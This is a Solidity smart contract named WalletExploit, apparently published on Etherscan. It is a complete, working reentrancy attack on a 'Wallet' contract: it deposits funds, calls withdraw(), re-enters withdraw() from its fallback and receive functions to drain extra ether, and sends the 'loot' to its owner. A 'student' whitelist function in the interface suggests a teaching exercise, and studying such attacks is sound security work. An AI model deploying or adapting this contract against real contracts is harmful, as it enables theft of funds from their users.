/**
 *Submitted for verification at Etherscan.io on 2022-01-26
*/

pragma solidity >=0.7.0 <0.9.0;

contract WalletExploit{

    Wallet public target;
    address payable owner;
    uint public count;
    uint public maxCount;

    constructor(address wallet){
        owner = payable(msg.sender);
        target = Wallet(wallet);
        count = 0;
        maxCount = 2;
    }

    function setMax(uint max) public{
        require(msg.sender == owner, "Only owner");
        maxCount = max;
    }


    function setTarget(address wallet) public{
        require(msg.sender == owner, "Only owner");
        target = Wallet(wallet);
        count = 0;
    }

    function deposit() public payable{
        require(msg.sender == owner, "Only owner");
        target.deposit{value: msg.value}();
    }

    function exploit() public payable{
        require(msg.sender == owner, "Only owner");
        target.withdraw();
    }

    function withdrawLoot() public{
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }

    fallback() external payable{
        if(count < maxCount){
            count = count + 1;
            target.withdraw();
        }
    }

    receive() external payable{
        if(count < maxCount){
            count = count + 1;
            target.withdraw();
        }
    }

    function getCount() public view returns(uint){
        return count;
    }

}

interface Wallet {
    function deposit() external payable;
    function withdraw() external;
    function depositOwner() external payable;
    function getBalance() external view returns(uint);
    function addWhiteList(address student) external;
}